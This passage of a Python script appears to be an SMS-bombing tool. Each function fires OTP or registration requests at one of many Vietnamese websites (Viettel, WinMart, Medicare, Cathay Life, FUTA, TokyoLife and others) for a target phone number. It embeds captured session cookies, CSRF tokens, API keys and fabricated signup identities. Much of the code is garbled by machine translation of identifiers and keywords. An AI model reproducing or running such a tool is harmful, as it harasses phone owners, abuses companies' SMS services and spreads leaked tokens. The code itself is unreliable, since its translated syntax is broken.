        'mst-cache-warmer-track': '1722425411057',
        'private_content_version': 'e7d88709c6ccef5f8c32a41289ece818',
    }

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/javascript, */*; q=0.01',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=fm7TzaicsnmIyKbm; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=450982644b33ef1223c1657bb0c43204; form_key=fm7TzaicsnmIyKbm; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1722425411057; private_content_version=e7d88709c6ccef5f8c32a41289ece818',
        'dnt': '1',
        'di tích mới': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjA5YWE0NzczZGUzM2 IxNTciLCJ0ciI6ImFiMWFmYzBkNDUwMTE1Y2U5ZTE0ZjdhZmZmOTI3MTQ5IiwidGkiOjE3MjI0MjU0NDExMDMsInRrIjoiMTMyMjg0MCJ9fQ==',
        'nguồn gốc': 'https://hoang-phuc.com',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'dấu vết': '00-ab1afc0d450115ce9e14f7afff927149-09aa4773de33b157-01',
        'dấu vết': '1322840@nr=0-1-4173019-1120237972-09aa4773de33b157----1722425441103',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    dữ liệu = {
        'action_type': '1',
        'ĐT': sdt,
    }

    phản hồi = yêu cầu.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookie=cookies, headers=headers, data=data)
    


def send_otp_via_fmcomvn(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'ủy quyền': 'Người mang',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://fm.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://fm.com.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'đúng',
        'x-requestid': '00c641a2-05fb-4541-b5af-220b4b0aa23c',
    }

    dữ liệu json = {
        'Điện thoại': sdt,
        'LatOfMap': '106',
        'LongOfMap': '108',
        'Trình duyệt': '',
    }

    phản hồi = yêu cầu.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)

    


def send_otp_via_Reebokvn(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'chấp nhận-ngôn ngữ': 'vi',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'khóa': '63ea1845891e8995ecb2304b558cdeab',
        'nguồn gốc': 'https://reebok.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'dấu thời gian': '1722425836500',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'số điện thoại': sdt,
    }

    phản hồi = yêu cầu.đăng(
        'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    



def send_otp_via_thefaceshop(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'chấp nhận-ngôn ngữ': 'vi',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'khóa': 'c3ef5fcbab3e7ebd82794a39da791ff6',
        'nguồn gốc': 'https://thefaceshop.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'dấu thời gian': '1722425954937',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'số điện thoại': sdt,
    }

    phản hồi = yêu cầu.đăng(
        'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    


def send_otp_via_BEAUTYBOX(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'chấp nhận-ngôn ngữ': 'vi',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'khóa': 'ac41e98f028aa44aac947da26ceb7cff',
        'nguồn gốc': 'https://beautybox.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'dấu thời gian': '1722426119478',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'số điện thoại': sdt,
    }

    phản hồi = yêu cầu.đăng(
        'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    



def send_otp_via_winmart(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'ủy quyền': 'Người mang không xác định',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://winmart.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://winmart.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-merchant': 'WCM',
    }

    dữ liệu json = {
        'firstName': 'Nguyễn Quang Ngọc',
        'số điện thoại': sdt,
        'masanReferralCode': '',
        'ngày sinh': '2000-02-05',
        'giới tính': 'Nam',
    }

    phản hồi = yêu cầu.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)

    

def send_otp_via_medicare(sdt):
    tiêu đề = {
        'Chấp nhận': 'application/json, text/plain, */*',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Loại nội dung': 'ứng dụng/json',
        # 'Cookie': 'SERVER=nginx2; XSRF-TOKEN=eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSF NQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNT Q1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6ImJ2NlA2U253YkQ0NXFoWXRtSVpYcHc9PSIsInZhbHVlIjoiUjk0N0k1cytwTzFqV3d6UjFwUUJOZ09HMTdDdTJzWTR2WSswblhFWkxhVTFiZVkyUTlHelN2Ympvb0VidVgrYUFnT0s3WkRCeTdDcmJMK2R tM1J3YUxBUm5aOUtvaUZ0R2lmMURBR2o3UUxLQTZ6ODBJVFNsTnN0NUNocHJVZ1QiLCJtYWMiOiI0ZTA4NTc0MjE2M GUzYTFiZWU2MjNhMmVkOTUzMWFiMWYxMDJjNTRiMmJiZmUyMzU1YmZjZTQxNTA2Zjc0Zjc2IiwidGFnIjoiIn0%3D',
        'DNT': '1',
        'Nguồn gốc': 'https://medicare.vn',
        'Người giới thiệu': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-XSRF-TOKEN': 'eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0 x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'di động': sdt,
        'mobile_country_prefix': '84',
    }

    phản hồi = yêu cầu.post('https://medicare.vn/api/otp', headers=headers, json=json_data)

    



def send_otp_via_futabus(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://futabus.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://futabus.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjBjYjQyNzQyYWU1OGY0ZGE0NjdiY2RhZWE0Yjk1YTI5ZmJhMGM1ZjkiLCJ0eXAiOiJKV1QifQ..nP7jES3RVs4QgGnUoJKXml9KS7ZjOwuMlSaRklAjA7Kp8bKGmJRJFCLb1bX_am-nXovNAQ9mZ_68k7BII6SEahctrppOqeubMO-rtOfS8zOGd0_9_fWi9DB IEjEjuNJYhd55USesLwVtb5zd3fg5qjbC-QZAKo4J-V61HQvQEIBEe2EDSqDKGdtsZZ7ph33Kl5vGcpINGH-yt-2gkFAmyaoft6PpjjcS7wC_RpRkGi_bwUxG6JNXQUyBZq82T84JuqdolplXABMxd1gSBLNeBazriCAGYLsRexuvFHoet7VvEnlSm3Gnlf1oTIuR0nm1qRPsOA5W-RbZzu45fSv5jQ',
        'x-app-id': 'khách hàng',
    }

    dữ liệu json = {
        'số điện thoại': sdt,
        'deviceId': 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
        'use_for': 'ĐĂNG NHẬP',
    }

    phản hồi = yêu cầu.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)

    



def send_otp_via_ViettelPost(sdt):
    tiêu đề = {
        'Chấp nhận': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kiểm soát bộ nhớ đệm': 'max-age=0',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.139_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-6owN8knL2LbNscfq8MFTRbw99Sv3SFBfrd1CJOj7uAeEKh6JTpmTaQY6SQyxuO1FiTR7b5yt9vSgof__Zpr9Aiscx8VXG8mf2fhiL19u2aGDm-ekRWdqgJUq_eCLNleE',
        'DNT': '1',
        'Nguồn gốc': 'null',
        'Sec-Fetch-Dest': 'tài liệu',
        'Sec-Fetch-Mode': 'điều hướng',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'Người dùng lấy thông tin bí mật': '?1',
        'Yêu cầu nâng cấp không an toàn': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu = {
        'FormRegister.FullName': 'Nguyễn Quang Ngọc',
        'FormRegister.Phone': sdt,
        'FormRegister.Password': 'BEAUTYBOX12a@',
        'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt',
        'ConfirmOtpType': 'Đăng ký',
        'FormRegister.IsRegisterFromPhone': 'đúng',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
    }

    phản hồi = yêu cầu.post('https://id.viettelpost.vn/Account/SendOTPByPhone', headers=headers, data=data)
    


def send_otp_via_myviettel2(sdt):
    tiêu đề = {
        'Chấp nhận': 'application/json, text/plain, */*',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'redirectLogin=https://viettel.vn/myviettel; laravel_session=qCs3S11kNAldWtLh8UYFGYbq6YicwmeargiwDoFy; XSRF-TOKEN=eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjI xZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ%3D%3D',
        'DNT': '1',
        'Nguồn gốc': 'https://viettel.vn',
        'Người giới thiệu': 'https://viettel.vn/myviettel',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-CSRF-TOKEN': 'PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7',
        'X-Yêu cầu-Với': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'msisdn': sdt,
        'loại': 'đăng ký',
    }

    phản hồi = yêu cầu.post('https://viettel.vn/api/get-otp-contract-mobile', headers=headers, json=json_data)

def send_otp_via_myviettel3(sdt):
    bánh quy = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4 bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    tiêu đề = {
        'Chấp nhận': 'application/json, text/plain, */*',
        'Ngôn ngữ chấp nhận': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl 4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODddkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Nguồn gốc': 'https://viettel.vn',
        'Người giới thiệu': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Yêu cầu-Với': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Không phải là thương hiệu";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'msisdn': sdt,
    }

    phản hồi = yêu cầu.post('https://viettel.vn/api/get-otp', cookie=cookies, headers=headers, json=json_data)

def send_otp_via_TOKYOLIFE(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://tokyolife.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'chữ ký': 'c5b0d82fae6baaced6c7f383498dfeb5',
        'dấu thời gian': '1722427632213',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'số_điện_thoại': sdt,
        'tên': 'Nguyễn Quang Ngọc',
        'mật khẩu': 'pUL3.GFSd4MWYXp',
        'email': 'reggg10tb@gmail.com',
        'sinh nhật': '2002-03-12',
        'giới tính': 'nam',
    }

    phản hồi = yêu cầu. bài đăng ('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', tiêu đề = tiêu đề, json = json_data)
    


def send_otp_via_30shine(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'ủy quyền': '',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://30shine.com',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://30shine.com/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'điện thoại': sdt,
    }

    phản hồi = yêu cầu.đăng(
        'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    


def send_otp_via_Cathaylife(sdt):
    bánh quy = {
        'JSESSIONID': 'ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'TS01f67c5d': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
        'BIGipServerB2C_http': '!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==',
        'TS0173f952': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
        'TSPD_101': '085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4 675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50d b15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c76ce 4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0',
        'INITSESSIONID': 'e0266dc6478152a4358bd3d4ae77bde0',
    }

    tiêu đề = {
        'Chấp nhận': 'application/json, text/javascript, */*; q=0.01',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'JSESSIONID=ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67; BIGipServerB2C_http=!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==; TS0173f952=0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67; TSPD_101=085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b6 78e16d4675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd 7c50db15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c7 6ce4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0; INITSESSIONID=e0266dc6478152a4358bd3d4ae77bde0',
        'DNT': '1',
        'Nguồn gốc': 'https://www.cathaylife.com.vn',
        'Người giới thiệu': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Yêu cầu-Với': 'XMLHttpRequest',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu = {
        'memberMap': f'{{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{sdt}","email":"rancellramseyis792@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyễn Quang Ngọc"}}',
        'OTP_TYPE': 'P',
        'LANGS': 'vi_VN',
    }

    phản hồi = yêu cầu.đăng(
        'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
        cookie=cookie,
        headers=tiêu đề,
        dữ liệu=dữ liệu,
    )

    

def send_otp_via_dominos(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'chấp nhận-ngôn ngữ': 'vi',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dmn': 'DSNKFN',
        'dnt': '1',
        'nguồn gốc': 'https://dominos.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://dominos.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
